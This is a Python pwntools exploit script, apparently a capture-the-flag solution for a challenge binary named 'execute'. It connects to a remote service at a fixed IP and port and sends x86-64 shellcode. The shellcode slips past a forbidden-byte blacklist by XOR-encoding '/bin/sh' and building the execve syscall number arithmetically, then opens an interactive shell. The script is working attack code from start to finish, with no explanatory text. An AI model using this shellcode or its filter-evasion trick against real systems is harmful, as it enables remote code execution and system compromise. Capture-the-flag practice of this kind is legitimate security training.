#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./execute', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


c
''')

p = remote('94.237.63.109',34542) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# Use when leaked is needed
# p.recvuntil(b'at: ')
# stack_leak = int(p.recvuntil(b'.', drop=True), 16) # Adjust this
# log.info("Stack leak: " + hex(stack_leak))

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

shellcode = asm(
    '''
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff 

    push rdi
    mov rdi, rsp

    push rax
    mov rsi, rax
    mov rdx, rax          

    push 0x3a
    pop rax
    add al, 0x1
    syscall
    ''', arch='amd64')
print(f"Check shellcode: {shellcode}")
# for byte in shellcode:
#     if byte in blacklist:
#         print(f'BAD BYTE --> 0x{byte:02x}')
#         print(f'ASCII --> {chr(byte)}')

sl(shellcode)
p.interactive()
